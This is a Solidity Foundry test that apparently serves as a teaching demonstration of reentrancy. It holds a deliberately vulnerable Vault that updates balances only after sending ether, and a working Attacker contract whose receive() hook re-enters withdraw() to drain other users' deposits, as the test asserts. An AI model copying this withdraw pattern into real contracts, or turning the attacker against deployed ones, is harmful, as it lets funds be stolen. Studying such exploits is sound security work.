// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract Vault {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balance[msg.sender];
        require(amount > 0, "nothing");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        balance[msg.sender] = 0; // too late: only after sending
    }

    receive() external payable {
        balance[msg.sender] += msg.value;
    }
}

contract Victim {
    // Other, honest users keep money here.
}

contract ReentrancyTest is Test {
    Vault vault;

    function setUp() public {
        vault = new Vault();
        // Honest users deposit 10 ETH.
        address alice = address(0xA11CE);
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        vault.deposit{value: 10 ether}();
    }

    function testExploit() public {
        Attacker a = new Attacker(vault);
        vm.deal(address(a), 1 ether);
        a.attack{value: 1 ether}();
        // The attacker put in 1 ETH and took out 11 ETH -> vault empty.
        assertEq(address(vault).balance, 0, "vault not drained");
        assertGt(address(a).balance, 10 ether, "no profit");
    }
}

contract Attacker {
    Vault immutable vault;

    constructor(Vault v) {
        vault = v;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw();
        }
    }
}
